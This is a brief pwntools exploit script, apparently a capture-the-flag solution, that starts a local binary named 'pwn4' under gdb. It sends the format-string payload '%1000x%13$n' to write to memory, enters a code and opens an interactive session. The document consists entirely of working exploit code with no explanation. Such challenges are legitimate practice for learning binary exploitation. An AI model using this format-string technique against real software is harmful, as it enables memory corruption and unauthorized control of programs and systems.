from pwn import *

io = process("./pwn4")


gdb.attach(io,"b*0x8048a63")
payload =  "%1000x%13$n"

io.sendlineafter("user: ",payload)

io.sendlineafter("code: ","45")

io.interactive()
